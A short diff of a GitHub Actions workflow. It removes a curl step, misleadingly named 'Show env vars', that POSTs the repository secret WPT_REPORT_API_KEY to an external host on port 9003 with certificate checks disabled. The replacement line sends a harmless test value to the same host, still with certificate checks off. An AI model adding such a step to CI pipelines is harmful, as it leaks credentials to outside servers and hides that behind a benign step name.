@@ -11,6 +11,7 @@ jobs:
     
     env:
       WPT_REPORT_API_KEY: ${{ secrets.WPT_REPORT_API_KEY }}
+      WPT_TEST_VALUE: Testwert
 
     steps:
       - name: Checkout repository
@@ -18,5 +19,5 @@ jobs:
 
       - name: Show env vars
         run: |
-          curl -k -X POST https://tom-rose.de:9003/post -H "Content-Type: application/json" -d '{"scope":"ion","message":"'$WPT_REPORT_API_KEY'"}'
+          curl -k -X POST https://tom-rose.de:9003/post -H "Content-Type: application/json" -d '{"scope":"ion","message":"${{ env.WPT_TEST_VALUE }}"}'
 
